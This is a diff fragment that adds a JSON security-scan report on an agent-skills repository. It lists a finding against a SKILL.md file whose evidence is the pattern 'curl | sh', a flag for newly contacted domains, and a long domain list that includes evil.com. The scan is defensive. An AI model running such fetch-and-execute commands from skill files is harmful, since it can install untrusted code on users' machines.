+      "path": "ThumbGate-105f28931956463c6bb7d25b353ac1759cda1e86/.agents/skills/mintlify-knowledge-honesty-not-clone/SKILL.md",
+      "line": 25,
+      "evidence": "curl \\| sh",
+      "file_sha256": "fc931dc6c938b2b54c15716db7c2e5c543b83e56b7bdcc8d77e7103c2cab9fff"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "iganapolsky.gumroad.com",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "agoragentic.com",
+    "aistudio.google.com",
+    "anysphere.cursor-deeplink",
+    "api.example.com",
+    "api.hotdata.dev",
+    "api.ideabrowser.com",
+    "api.oraclestechnologies.com",
+    "app.hotdata.dev",
+    "arcjet.com",
+    "arxiv.org",
+    "assets.mysiren.ai",
+    "buy.stripe.com",
+    "buymeacoffee.com",
+    "chat.openai.com",
+    "chatgpt.com",
+    "claude.ai",
+    "compliancehub.wiki",
+    "confidence.spotify.com",
+    "cursor.com",
+    "dashscope-intl.aliyuncs.com",
+    "dev.to",
+    "developercertificate.org",
+    "developers.openai.com",
+    "devops.com",
+    "dialogflow.googleapis.com",
+    "dirac.run",
+    "docs.arcjet.com",
+    "docs.gitguardian.com",
+    "docs.x.ai",
+    "dotenvx.com",
+    "edotenv.com",
+    "elevenlabs.io",
+    "ent.ai",
+    "evil.com",
+    "feross.org",
+    "fortune.com",
+    "generativelanguage.googleapis.com",
+    "github.com",
+    "hn.algolia.com",
+    "huggingface.co",
+    "iganapolsky.gumroad.com",
+    "integrate.api.nvidia.com",
+    "json-schema.org",
+    "mcp.confidence.dev",
+    "mysiren.ai",
+    "netflixtechblog.com",
+    "oakandsparrowsystemsenterprise.io",
+    "openapi.vercel.sh",
+    "opencode.ai",
+    "opencollective.com",
+    "opensource.org",
+    "paypal.me",
+    "platform.claude.com",
+    "plausible.io",
+    "poolsideai.gitbook.io",
+    "railway.app",
+    "registry.npmjs.org",
+    "reinai.io",
+    "schema.org",
+    "static.modelcontextprotocol.io",
+    "strandsagents.com",
+    "tailscale.com",
+    "thenewstack.io",
+    "thumbgate-production.up.railway.app",
+    "thumbgate.ai",
+    "thumbgate.app",
+    "thumbgate.invalid",
+    "towardsdatascience.com",
+    "venturebeat.com",
+    "vlt.io",
+    "www.anthropic.com",
+    "www.artificiallawyer.com",
+    "www.broadcom.com",
+    "www.cloudflare.com",
+    "www.conventionalcommits.org",
+    "www.damiencharlotin.com",
+    "www.databricks.com",
+    "www.far.ai",
+    "www.googletagmanager.com",
+    "www.hotdata.dev",
+    "www.infoq.com",
+    "www.infoworld.com",
+    "www.linkedin.com",
+    "www.marktechpost.com",
+    "www.npmjs.com",
+    "www.okta.com",
+    "www.patreon.com",
+    "www.paypal.com",
+    "www.perplexity.ai",
+    "www.producthunt.com",
+    "www.radware.com",
+    "www.reddit.com",
+    "www.sitemaps.org",
+    "www.sonarsource.com",
+    "www.theregister.com",
+    "www.upwork.com",
+    "www.w3.org",
+    "x.ai",
+    "x.com"
+  ],
+  "install_script": false,
+  "score": "high"
+}
